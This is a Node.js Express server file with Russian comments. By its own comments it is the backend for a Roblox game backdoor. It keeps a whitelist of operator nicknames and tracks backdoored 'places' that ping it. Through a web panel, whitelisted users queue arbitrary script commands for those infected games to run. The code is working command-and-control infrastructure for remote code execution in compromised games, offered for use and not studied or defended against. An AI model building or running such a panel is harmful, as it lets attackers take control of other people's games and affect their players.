const express = require('express');
const cors = require('cors');
const app = express();

app.use(cors({ origin: '*' }));
app.use(express.json());

// База данных в памяти сервера
let whitelist = ["sewarg47"];
let activePlaces = {}; // Используем объект для хранения времени последнего пинга плейса: { placeId: timestamp }
let pendingScripts = {};

// 1. Добавление ника в белый список с сайта
app.post('/add-whitelist', (req, res) => {
    const nick = req.body.nick;
    if (nick) {
        if (!whitelist.includes(nick)) {
            whitelist.push(nick);
            console.log(`[+] Добавлен в whitelist: ${nick}`);
        }
        res.json({ success: true, whitelist: whitelist });
    } else {
        res.status(400).json({ success: false, error: 'Nick is required' });
    }
});

// 2. Проверка белого списка (для бэкдора из Роблокса)
app.get('/check-whitelist', (req, res) => {
    const nick = req.query.nick;
    if (whitelist.includes(nick)) {
        res.json({ allowed: true });
    } else {
        res.json({ allowed: false });
    }
});

// 3. НОВОЕ: Авто-регистрация / пинг забекдоренного плейса из игры
app.post('/ping-place', (req, res) => {
    const { placeId } = req.body;
    if (placeId) {
        // Запоминаем текущее время для этого плейса
        activePlaces[placeId] = Date.now();
        res.json({ success: true });
    } else {
        res.status(400).json({ success: false, error: 'PlaceID required' });
    }
});

// 4. Получение списка активных плейсов (автоматически удаляет те, что молчали больше 30 секунд)
app.get('/active-places', (req, res) => {
    const now = Date.now();
    let currentActive = [];
    
    for (let placeId in activePlaces) {
        // Если игра не отправляла пинг больше 30 секунд, считаем её закрытой
        if (now - activePlaces[placeId] < 30000) {
            currentActive.push(placeId);
        } else {
            delete activePlaces[placeId];
        }
    }
    
    res.json(currentActive);
});

// 5. Выполнение скрипта через веб-панель
app.post('/set-script', (req, res) => {
    const { placeId, command, nick } = req.body;
    if (!whitelist.includes(nick)) {
        return res.json({ success: false, status: 'not_in_whitelist' });
    }
    pendingScripts[placeId] = command;
    res.json({ success: true });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Oboudno Backend running on port ${PORT}`);
});
